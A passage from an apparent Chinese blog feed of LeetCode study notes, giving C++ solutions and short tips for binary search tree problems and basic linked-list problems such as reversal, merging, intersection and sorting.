class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="built_in">inorderTraversal</span>(root-&gt;left, nums);</span><br><span class="line">        nums.<span class="built_in">push_back</span>(root-&gt;val);</span><br><span class="line">        <span class="built_in">inorderTraversal</span>(root-&gt;right, nums);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">findTarget</span><span class="params">(TreeNode* root, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">        <span class="built_in">inorderTraversal</span>(root, nums);</span><br><span class="line">        <span class="type">int</span> start = <span class="number">0</span>, end = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (start &lt; end) &#123;</span><br><span class="line">            <span class="keyword">if</span> (k - nums[start] == nums[end])</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (k - nums[start] &gt; nums[end])</span><br><span class="line">                ++start;</span><br><span class="line">            <span class="keyword">else</span> --end;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：很简单，别想着使用空间复杂度为O(1)的解法了。</p></li><li><p>题目十六：<a href="https://leetcode.cn/problems/delete-node-in-a-bst">删除二叉搜索树中的节点</a><br>给定一个二叉搜索树的根节点root和一个值key，删除二叉搜索树中的key对应的节点，并保证二叉搜索树的性质不变。返回二叉搜索树(有可能被更新)的根节点的引用。<br><img src="https://assets.leetcode.com/uploads/2020/09/04/del_node_1.jpg" alt="示意图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">findNode</span><span class="params">(TreeNode* root, TreeNode* &amp;prev, <span class="type">const</span> <span class="type">int</span> key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val == key) <span class="keyword">return</span> root;</span><br><span class="line">        prev = root;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;val &lt; key)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">findNode</span>(root-&gt;right, prev, key);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">findNode</span>(root-&gt;left, prev, key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">deleteNode</span><span class="params">(TreeNode* root, <span class="type">int</span> key)</span> </span>&#123;</span><br><span class="line">        TreeNode *dummy = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">100001</span>);</span><br><span class="line">        dummy-&gt;left = root;</span><br><span class="line">        TreeNode *toDeletePrev = dummy;</span><br><span class="line">        TreeNode *toDelete = <span class="built_in">findNode</span>(root, toDeletePrev, key);</span><br><span class="line">        <span class="keyword">if</span> (toDelete == <span class="literal">nullptr</span>) <span class="keyword">return</span> dummy-&gt;left;</span><br><span class="line">        <span class="type">bool</span> flag = toDeletePrev-&gt;val &gt; toDelete-&gt;val;</span><br><span class="line">        TreeNode *toReplacePrev = <span class="literal">nullptr</span>;</span><br><span class="line">        TreeNode *toReplace = toDelete-&gt;right;</span><br><span class="line">        <span class="keyword">if</span> (toReplace == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (flag) toDeletePrev-&gt;left = toDelete-&gt;left;</span><br><span class="line">            <span class="keyword">else</span> toDeletePrev-&gt;right = toDelete-&gt;left;</span><br><span class="line">            <span class="keyword">delete</span> toDelete;</span><br><span class="line">            <span class="keyword">return</span> dummy-&gt;left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (toReplace-&gt;left != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            toReplacePrev = toReplace;</span><br><span class="line">            toReplace = toReplace-&gt;left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (toReplacePrev)</span><br><span class="line">            toReplacePrev-&gt;left = toReplace-&gt;right;</span><br><span class="line">        <span class="keyword">else</span> toDelete-&gt;right = toReplace-&gt;right;</span><br><span class="line">        toReplace-&gt;left = toDelete-&gt;left;</span><br><span class="line">        toReplace-&gt;right = toDelete-&gt;right;</span><br><span class="line">        <span class="keyword">if</span> (flag) toDeletePrev-&gt;left = toReplace;</span><br><span class="line">        <span class="keyword">else</span> toDeletePrev-&gt;right = toReplace;</span><br><span class="line">        <span class="keyword">delete</span> toDelete;</span><br><span class="line">        <span class="keyword">return</span> dummy-&gt;left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：实际上并不难，想好替换的步骤即可，对于替换的节点有两种选择：左子树的最右节点或者是右子树的最左节点。</p></li><li><p>题目十七：<a href="https://leetcode.cn/problems/convert-sorted-list-to-binary-search-tree">有序链表转换二叉搜索树</a><br>给定一个单链表的头节点head，其中的元素按升序排序，将其转换为平衡二叉搜索树。<br><img src="https://assets.leetcode.com/uploads/2020/08/17/linked.jpg" alt="示意图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">buildTreeByList</span><span class="params">(ListNode* head, <span class="type">int</span> l, <span class="type">int</span> r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l &gt; r) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        ListNode *mid = head;</span><br><span class="line">        <span class="type">int</span> steps = (r - l) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; steps; ++i)</span><br><span class="line">            mid = mid-&gt;next;</span><br><span class="line">        TreeNode *node = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(mid-&gt;val);</span><br><span class="line">        ListNode *right = mid-&gt;next;</span><br><span class="line">        mid = <span class="literal">nullptr</span>;</span><br><span class="line">        node-&gt;left = <span class="built_in">buildTreeByList</span>(head, l, l + steps - <span class="number">1</span>);</span><br><span class="line">        node-&gt;right = <span class="built_in">buildTreeByList</span>(right, l + steps + <span class="number">1</span>, r);</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">sortedListToBST</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        ListNode *temp = head;</span><br><span class="line">        <span class="type">int</span> size = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (temp != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            ++size;</span><br><span class="line">            temp = temp-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">buildTreeByList</span>(head, <span class="number">0</span>, size - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：还是比较简单的，主要思路是先找到中间节点然后进行两边的分治，因为是平衡二叉树所以每次找中间节点当作树的根节点即可。</p></li><li><p>题目十八：<a href="https://leetcode.cn/problems/increasing-order-search-tree">递增顺序搜索树</a><br>给你一棵二叉搜索树的root，请你按中序遍历将其重新排列为一棵递增顺序搜索树。<br><img src="https://assets.leetcode.com/uploads/2020/11/17/ex1.jpg" alt="示意图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">increasingBST</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        TreeNode *dummy = <span class="keyword">new</span> <span class="built_in">TreeNode</span>();</span><br><span class="line">        TreeNode *opTree = dummy;</span><br><span class="line">        stack&lt;TreeNode *&gt; s;</span><br><span class="line">        s.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">while</span> (!s.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            TreeNode *node = s.<span class="built_in">top</span>();</span><br><span class="line">            <span class="keyword">if</span> (node-&gt;left != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                s.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                node-&gt;left = <span class="literal">nullptr</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            opTree-&gt;right = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(node-&gt;val);</span><br><span class="line">            opTree = opTree-&gt;right;</span><br><span class="line">            s.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span> (node-&gt;right != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                s.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">                node-&gt;right = <span class="literal">nullptr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：很简单的中序遍历即可完成，这里采用的是迭代的写法，也可以使用递归的写法来完成。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> LeetCode </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode刷题笔记(十二): 链表</title>
      <link href="/post/6177849d.html"/>
      <url>/post/6177849d.html</url>
      
        <content type="html"><![CDATA[<p>数据结构介绍：链表是由节点和指针构成的数据结构，每个节点存有一个值，和一个指向下一个节点的指针，因此很多链表问题可以用递归来处理。不同于数组，链表并不能直接获取任意节点的值，必须要通过指针找到该节点后才能获取其值。同理，在未遍历到链表结尾时，我们也无法知道链表的长度，除非依赖其他数据结构储存长度。</p><ul><li>代码实现：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    ListNode *next;</span><br><span class="line">    <span class="built_in">ListNode</span>(<span class="type">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li>补充：由于在进行链表操作时，尤其是删除节点时，经常会因为对当前节点进行操作而导致内存或指针出现问题。有两个小技巧可以解决这个问题：一是尽量处理当前节点的下一个节点而非当前节点本身，二是建立一个虚拟节点(dummy node)，使其指向当前链表的头节点，这样即使原链表所有节点全被删除，也会有一个dummy存在，返回dummy-&gt;next即可。</li></ul><h2 id="一、链表的基本操作"><a href="#一、链表的基本操作" class="headerlink" title="一、链表的基本操作"></a>一、链表的基本操作</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/reverse-linked-list">反转链表</a><br>翻转一个链表。<br><img src="https://assets.leetcode.com/uploads/2021/02/19/rev1ex1.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    ListNode *next;</span><br><span class="line">    <span class="built_in">ListNode</span>() : <span class="built_in">val</span>(<span class="number">0</span>), <span class="built_in">next</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">    <span class="built_in">ListNode</span>(<span class="type">int</span> x) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(<span class="literal">nullptr</span>) &#123;&#125;</span><br><span class="line">    <span class="built_in">ListNode</span>(<span class="type">int</span> x, ListNode *next) : <span class="built_in">val</span>(x), <span class="built_in">next</span>(next) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        ListNode* res = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">while</span> (head != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            ListNode* next = head-&gt;next;</span><br><span class="line">            head-&gt;next = res;</span><br><span class="line">            res = head;</span><br><span class="line">            head = next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：就是简单的模拟，注意操作的先后顺序。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/merge-two-sorted-lists">合并两个有序链表</a><br>给定两个增序的链表，试将其合并成一个增序的链表。<br><img src="https://assets.leetcode.com/uploads/2020/10/03/merge_ex1.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">mergeTwoLists</span><span class="params">(ListNode* list1, ListNode* list2)</span> </span>&#123;</span><br><span class="line">        ListNode* res = <span class="keyword">new</span> <span class="built_in">ListNode</span>();</span><br><span class="line">        ListNode* opList = res;</span><br><span class="line">        <span class="keyword">while</span> (list1 != <span class="literal">nullptr</span> || list2 != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            ListNode* temp = <span class="literal">nullptr</span>;</span><br><span class="line">            <span class="keyword">if</span> (list1 == <span class="literal">nullptr</span> || list2 != <span class="literal">nullptr</span> &amp;&amp; list1-&gt;val &gt;= list2-&gt;val) &#123;</span><br><span class="line">                temp = <span class="keyword">new</span> <span class="built_in">ListNode</span>(list2-&gt;val);</span><br><span class="line">                list2 = list2-&gt;next;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (list2 == <span class="literal">nullptr</span> || list1 != <span class="literal">nullptr</span> &amp;&amp; list1-&gt;val &lt; list2-&gt;val) &#123;</span><br><span class="line">                temp = <span class="keyword">new</span> <span class="built_in">ListNode</span>(list1-&gt;val);</span><br><span class="line">                list1 = list1-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            opList-&gt;next = temp;</span><br><span class="line">            opList = opList-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：注意边界的nullptr情况。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/swap-nodes-in-pairs">两两交换链表中的节点</a><br>给定一个链表，交换每个相邻的一对节点。<br><img src="https://assets.leetcode.com/uploads/2020/10/03/swap_ex1.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">swapPairs</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">nullptr</span> || head-&gt;next == <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        ListNode* prev = <span class="literal">nullptr</span>;</span><br><span class="line">        ListNode* res = head-&gt;next;</span><br><span class="line">        <span class="keyword">while</span>(head != <span class="literal">nullptr</span> &amp;&amp; head-&gt;next != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            ListNode* next = head-&gt;next;</span><br><span class="line">            head-&gt;next = next-&gt;next;</span><br><span class="line">            next-&gt;next = head;</span><br><span class="line">            <span class="keyword">if</span> (prev != <span class="literal">nullptr</span>) prev-&gt;next = next;</span><br><span class="line">            prev = head;</span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：不是很难，但需要注意的是要记录prev用于把next加入链表。</p></li></ul><h2 id="二、其他链表技巧"><a href="#二、其他链表技巧" class="headerlink" title="二、其他链表技巧"></a>二、其他链表技巧</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/intersection-of-two-linked-lists">相交链表</a><br>给定两个链表，判断它们是否相交于一点，并求这个相交节点。<br><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/14/160_statement.png" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">getIntersectionNode</span><span class="params">(ListNode *headA, ListNode *headB)</span> </span>&#123;</span><br><span class="line">        ListNode *list1 = headA, *list2 = headB;</span><br><span class="line">        <span class="keyword">while</span> (list1 != list2) &#123;</span><br><span class="line">            list1 = list1 != <span class="literal">nullptr</span> ? list1-&gt;next : headB;</span><br><span class="line">            list2 = list2 != <span class="literal">nullptr</span> ? list2-&gt;next : headA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：假设链表A的头节点到相交点的距离是a，链表B的头节点到相交点的距离是b，相交点到链表终点的距离为c。我们使用两个指针，分别指向两个链表的头节点，并以相同的速度前进，若到达链表结尾，则移动到另一条链表的头节点继续前进。按照这种前进方法，两个指针会在a+b+c次前进后同时到达相交节点。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/palindrome-linked-list">回文链表</a><br>以O(1)的空间复杂度，判断链表是否回文。<br><img src="https://assets.leetcode.com/uploads/2021/03/03/pal1linked-list.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; stack;</span><br><span class="line">        ListNode *fast = head, *slow = head;</span><br><span class="line">        <span class="keyword">while</span> (fast != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            stack.<span class="built_in">push_back</span>(slow-&gt;val);</span><br><span class="line">            slow = slow-&gt;next;</span><br><span class="line">            fast = fast-&gt;next;</span><br><span class="line">            <span class="keyword">if</span> (fast != <span class="literal">nullptr</span>) fast = fast-&gt;next;</span><br><span class="line">            <span class="keyword">else</span> stack.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (slow != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (stack.<span class="built_in">back</span>() == slow-&gt;val)</span><br><span class="line">                stack.<span class="built_in">pop_back</span>();</span><br><span class="line">            slow = slow-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stack.<span class="built_in">empty</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：使用反转链表即可完成O(1)的空间复杂度，这里给出另一种写法。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/remove-nth-node-from-end-of-list">删除链表的倒数第 N 个结点</a><br>给你一个链表，删除链表的倒数第n个结点，并且返回链表的头结点。<br><img src="https://assets.leetcode.com/uploads/2020/10/03/remove_ex1.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">removeNthFromEnd</span><span class="params">(ListNode* head, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// if (head-&gt;next == nullptr) return nullptr;</span></span><br><span class="line">        ListNode *list1 = head, *list2 = head;</span><br><span class="line">        ListNode *prev = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">while</span> (n--)</span><br><span class="line">            list2 = list2-&gt;next;</span><br><span class="line">        <span class="keyword">while</span> (list2 != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            prev = list1;</span><br><span class="line">            list1 = list1-&gt;next;</span><br><span class="line">            list2 = list2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (prev == <span class="literal">nullptr</span>) <span class="keyword">return</span> list1-&gt;next;</span><br><span class="line">        prev-&gt;next = list1-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> list1;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：本质上也是一种快慢指针，不知道为什么是中等题。</p></li><li><p>题目四：<a href="https://leetcode.cn/problems/sort-list">排序链表</a><br>给你链表的头结点head，请将其按升序排列并返回排序后的链表。<br><img src="https://assets.leetcode.com/uploads/2020/09/14/sort_list_1.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getListLength</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> length = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (head) &#123;</span><br><span class="line">            length++;</span><br><span class="line">            head = head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">ListNode *<span class="title">splitList</span><span class="params">(ListNode *head, <span class="type">int</span> size)</span> </span>&#123;</span><br><span class="line">        ListNode *cur = head;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size - <span class="number">1</span> &amp;&amp; cur; i++)</span><br><span class="line">            cur = cur-&gt;next;</span><br><span class="line">        <span class="keyword">if</span> (cur == <span class="literal">nullptr</span> || cur-&gt;next == <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>; </span><br><span class="line">        ListNode *next_head = cur-&gt;next;</span><br><span class="line">        cur-&gt;next = <span class="literal">nullptr</span>; </span><br><span class="line">        <span class="keyword">return</span> next_head;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">pair&lt;ListNode *, ListNode *&gt; <span class="title">mergeTwoLists</span><span class="params">(ListNode *list1, ListNode *list2)</span> </span>&#123;</span><br><span class="line">        ListNode dummy;         </span><br><span class="line">        ListNode *cur = &amp;dummy; </span><br><span class="line">        <span class="keyword">while</span> (list1 &amp;&amp; list2) &#123;</span><br><span class="line">            <span 